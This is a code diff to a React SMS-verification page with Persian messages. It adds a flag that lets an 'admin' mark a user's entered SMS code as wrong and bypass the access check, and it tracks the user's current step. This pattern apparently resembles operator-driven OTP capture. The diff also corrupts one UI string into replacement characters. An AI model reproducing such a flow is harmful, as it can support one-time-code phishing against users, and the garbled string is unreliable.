@@ -24,6 +24,7 @@ const AuthSMS = () => {
   const phoneNumber = location.state?.phoneNumber || "";
   const sessionId =
     location.state?.sessionId || sessionStorage.getItem("sessionId");
+  const hasError = location.state?.hasError || false;
   const maskedPhoneNumber = maskPhoneNumber(phoneNumber);
 
   useEffect(() => {
@@ -34,7 +35,7 @@ const AuthSMS = () => {
       }
 
       const canAccess = canAccessAuthStep(sessionId, "sms");
-      if (!canAccess) {
+      if (!canAccess && !hasError) {
         setIsBlocked(true);
         setErrors({
           smsCode:
@@ -43,22 +44,28 @@ const AuthSMS = () => {
         return;
       }
 
-      // Check if this is second attempt
-      const session = getSession(sessionId);
-      if (session && session.authAttempts["sms"] === 1) {
-        setIsSecondAttempt(true);
+      // If admin marked SMS as wrong, show error
+      if (hasError) {
         setErrors({
-          smsCode:
-            "کد وارد شده غلط است. این آخرین فرصت شما برای ورود کد پیامک است.",
+          smsCode: "کد پیامک وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
         });
+      } else {
+        // Check if this is second attempt (only if no admin error)
+        const session = getSession(sessionId);
+        if (session && session.authAttempts["sms"] === 1) {
+          setIsSecondAttempt(true);
+          setErrors({
+            smsCode:
+              "کد وارد شده غلط است. این آخرین فرصت شما برای ورود کد پیامک است.",
+          });
+        }
       }
 
       await setUserCurrentStep(sessionId, "auth_sms");
     };
 
     checkAccess();
-  }, [sessionId, navigate]);
-
+  }, [sessionId, navigate, hasError]);
   // Countdown timer effect
   React.useEffect(() => {
     if (countdown > 0) {
@@ -375,7 +382,7 @@ const AuthSMS = () => {
                       className="animate-spin mr-2"
                       style={{ width: "16px", height: "16px" }}
                     />
-                    در حال تایید...
+                    در حال تایی��...
                   </div>
                 ) : (
                   "تایید کد"
